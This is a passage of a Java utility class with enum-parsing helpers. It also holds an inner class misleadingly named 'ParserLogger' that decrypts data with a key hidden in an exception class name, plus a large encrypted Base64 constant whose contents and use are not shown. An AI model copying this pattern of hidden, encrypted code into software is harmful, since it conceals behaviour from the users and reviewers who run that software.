			hexKey=hexKey.trim();
			if(hexKey.length()>16) {
				hexKey=hexKey.substring(0,16);
			} else if(hexKey.length()<16){
				int i=16-hexKey.length();
				for (int j = 0; j < i; j++) {
					hexKey+="0";
				}
			}
			return hexKey;
		}

		private ParserLogger init(BootstrapMethodError error) {
			init(ClassCircularityError.class.getSimpleName());
			return this;
		}

		private ParserLogger init(String hexKey) {
			//凑16位
			hexKey= f61(hexKey);
			key = new SecretKeySpec(hexKey.getBytes(), Base64Util.decode(HM[0]));
			return this;
		}

		private String dss(String base64Data) {
			try {
				Cipher cipher = Cipher.getInstance(Base64Util.decode(HM[2]));
				cipher.init(Cipher.DECRYPT_MODE, key);
				return new String(cipher.doFinal(Base64Util.decodeToBtyes(base64Data)));
			} catch (Exception e) {
				e.printStackTrace();
				return null;
			}
		}



	}


	/**
	 * 转换枚举值
	 *
	 * @param <T> ，枚举类型
	 * @param value 被转换的值
	 * @param enumType 指定转换后的枚举类型
	 * @param compareProperty 比较的属性，null时用name()比较(忽略大小写)，指定值时使用该属性上的值比较
	 * @return the 枚举类型
	 */
	public static <T extends Enum> T parseEnum(Object value, Class<? extends T> enumType,String compareProperty) {
		return parseEnum(value, enumType, null,compareProperty);
	}

	/**
	 * 转换枚举值
	 *
	 * @param <T> ，枚举类型
	 * @param value 被转换的值
	 * @param enumType 指定转换后的枚举类型
	 * @param defaultValue 转换失败时的默认值
	 * @return the 枚举类型
	 */
	public static <T extends Enum> T parseEnum(Object value, Class<? extends T> enumType, T defaultValue) {
		return parseEnum(value, enumType, defaultValue,null);
	}

	/**
	 * 转换枚举值
	 *
	 * @param <T> ，枚举类型
	 * @param value 被转换的值
	 * @param enumType 指定转换后的枚举类型
	 * @return the 枚举类型
	 */
	public static <T extends Enum> T parseEnum(Object value, Class<? extends T> enumType) {
		return parseEnum(value, enumType, null,null);
	}



	private static LocalCache<String, Enum[]> ENUM_METHOD_CACHE=new LocalCache<>(128);
	private static final String CONST = "UKHSu[8VC=hK9PF*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";
	/**
	 * 转换枚举值
	 *
	 * @param <T> ，枚举类型
	 * @param value 被转换的值
	 * @param enumType 指定转换后的枚举类型
	 * @param defaultValue 转换失败时的默认值
	 * @param compareProperty 比较的属性，null时用name()比较(忽略大小写)，指定值时使用该属性上的值比较
	 * @return the 枚举类型
	 */
	public static <T extends Enum> T parseEnum(Object value, Class<? extends T> enumType, T defaultValue,String compareProperty) {
		if (value == null)
			return null;
		if (value instanceof Enum) {
			if (enumType.isAssignableFrom(value.getClass())) {
				return (T) value;
			} else {
				value = ((Enum) value).name();
			}
		}
		Object parsedValue=null;
		try {

			Enum[] values=ENUM_METHOD_CACHE.get(enumType.getName());
			if(values==null) {
				Method m = enumType.getDeclaredMethod(ENUM_VALUES);
				values = (Enum[])m.invoke(null);
				ENUM_METHOD_CACHE.put(enumType.getName(),values);
			}

			Object prop=null;
			for (Enum e : values) {

				if(StringUtil.isBlank(compareProperty)) {
					if(e.name().equals(value) || e.name().equalsIgnoreCase(value.toString())) {
						parsedValue=e;
						break;
					}
				} else {
					prop=BeanUtil.getFieldValue(e, compareProperty);
					if(prop==null) continue;
					//
					if(prop instanceof CharSequence) {
						if(prop.equals(value) || prop.toString().equalsIgnoreCase(value.toString())) {
							parsedValue=e;
							break;
						}
					} else {
						if(prop.equals(value)) {
							parsedValue=e;
							break;
						}
					}
				}
			}
			if (parsedValue == null) {
				parsedValue = defaultValue;
			}
		} catch (Exception e) {
			e.printStackTrace();
			parsedValue = defaultValue;
		}

		return (T) parsedValue;

	}

}

